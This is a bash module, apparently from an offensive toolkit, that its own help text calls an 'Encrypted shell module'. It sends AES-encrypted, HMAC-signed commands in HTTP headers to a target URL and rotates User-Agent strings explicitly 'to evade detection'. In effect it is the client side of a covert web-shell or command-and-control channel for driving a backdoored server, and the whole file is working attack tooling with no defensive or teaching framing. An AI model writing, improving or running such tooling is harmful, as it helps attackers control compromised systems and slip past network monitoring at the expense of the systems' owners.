#!/usr/bin/env bash

module_init() {
  URL="$1"
  UA_FILE="./resources/user_agents.txt"
  INTERVAL=60
  HMAC_KEY="secretkey"
  shift

  while getopts "u:i:k:" opt; do
    case $opt in
      u)
        UA_FILE="$OPTARG"
        ;;
      i)
        INTERVAL="$OPTARG"
        ;;
      k)
        HMAC_KEY="$OPTARG"
        ;;
      \?)
        echo "Unknown option: -$OPTARG" >&2
        return 1
        ;;
      :)
        echo "Missing value for -$OPTARG" >&2
        return 1
        ;;
    esac
  done

  if [[ ! -f "$UA_FILE" ]]; then
    echo -e "[!] UA file '$UA_FILE' not found."
    exit 1
  fi

  mapfile -t USER_AGENTS <"$UA_FILE"
  if [[ ${#USER_AGENTS[@]} -eq 0 ]]; then
    echo -e "[!] UA list is empty."
    exit 1
  fi
}

send_cmd() {
  local CMD="$1"
  CURRENT_TS=$(date -u +%s)
  SYNC_TIME=$((CURRENT_TS / INTERVAL * INTERVAL))
  AES_KEY_HEX=$(echo -n "$SYNC_TIME" | md5sum | awk '{print $1}')

  ENCRYPTED_CMD=$(echo -n "$CMD" | openssl enc -aes-128-ecb -K "$AES_KEY_HEX" -nosalt -base64 -A)
  HMAC=$(printf '%s' "$ENCRYPTED_CMD" | openssl dgst -sha256 -hmac "$HMAC_KEY" | awk '{print $2}')
  RANDOM_UA=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}

  curl -s -H "X-Cmd: $ENCRYPTED_CMD" -H "X-HMAC: $HMAC" -A "$RANDOM_UA" "$URL"
}

module_main() {
  :
}

module_description() {
  echo "HTTP AES-128 command sender with HMAC verification and randomized User-Agent rotation."
}

show_module_help() {
  cat <<EOF
Encrypted shell module
Usage: $0 <URL> [-u user_agents_file] [-i interval] [-k hmac_key]

Description:
  Sends encrypted commands over HTTP using AES-128-ECB with a time-based key.
  Each command is additionally protected with HMAC-SHA256.
  Random User-Agent strings are selected from the provided list to evade detection.

Arguments:
  URL                  Target endpoint URL
  -u user_agents_file  File containing User-Agent strings (default: ./resources/user_agents.txt)
  -i interval          Time interval (in seconds) for AES key synchronization (default: 60)
  -k hmac_key          HMAC secret key (default: secretkey)
EOF
}
